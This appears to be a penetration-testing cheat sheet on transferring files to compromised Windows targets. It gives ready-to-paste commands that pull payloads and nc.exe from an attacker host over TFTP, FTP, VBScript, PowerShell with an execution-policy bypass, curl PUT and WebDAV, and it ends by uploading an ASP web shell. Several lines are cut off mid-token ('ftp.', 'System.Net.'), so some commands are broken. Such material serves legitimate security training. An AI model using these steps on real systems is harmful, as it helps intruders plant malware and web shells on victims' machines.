Introduction

File Transfers: There are several ways to transfer files. TFTP, FTP, VBScript, Powershell, Wget, NC.

TFTP

Let's get started.

TFTP

First set up a TFTP Server on the kalibox. Create a tftp directory. Start tftpd service to serve files. Copy file you would like to move to the tftp directory.

copy 
mkdir /tftp
copy 
atftpd --daemon --port 69 /tftp
copy 
cp /usr/share/windows-binaries/nc.exe /tftp/

TFTP

Now you can get or put files from the windows machine.

copy 
tftp -i $kaliIP Get nc.exe

FTP

Let's get started.

FTP

Install FTP. Setup user and password

copy 
apt-get install pure-ftpd
copy 
cat setup-ftp
copy 
./setup-ftp

FTP

Copy the following and paste in the Windows target machine. This will create a connection to your ftp server, enter the username and password, set it to binary mode, grab your payload, and exit.
Note: you will need to change the ip to your ftp server.

copy 
echo open 192.x.x.x 21> ftp.txt
echo username>> ftp.txt
echo password>> ftp.txt
echo bin >> ftp.txt
echo GET Payload.exe >> ftp.
echo by >> ftp.
ftp -s:ftp.txt

FTP

Alternatively you can connect to an ftp service. You must have credentials or use anonymous ftp: Username: anonymous Password: anonymous.

copy 
ftp $ip 21
binary
PUT /root/payload.exe payload.ex
GET file.exe

VB Script

Let's get started.

VB

Copy your payload to /var/www/. Start your web server. Then copy the VB-Script below and paste it in the windows target machine.

copy 
cp payload.exe /var/www/
service apache2 start
copy 
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

VB Script

This is like a version of wget for Windows. You can use the following command cscript wget.vbs <your webserver address> <what you want to save the file as>

copy 
cscript wget.vbs http://192.x.x.x/payload.exe payload.exe

PowerShell

Let's get started.

PowerShell

This is also like a version of wget for Windows but with powershell. Copy the following into your windows target machine. You can use the following command: powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File
Note:Change the url as needed.

copy 
type wget.ps1
$storageDir = $pwd
$webclient = New-Object System.Net.
$url = "http://yourservername/file"
$file = "payload.exe"
$webclient.DownloadFile($url,$file)

Curl

Let's get started.

Curl

If the HTTP method PUT is enabled. You can upload a file to a web server via curl.
Note:Change the url as needed.

copy 
curl -T <localfile> http://targetip/folder/file
copy 
curl -d <localfile> -X PUT http://targetip/folder/file

Webdav with Cadaver

Install Cadaver with: apt-get install cadaver.

copy 
Cadaver http://$ip

Put shell.asp shell.txt
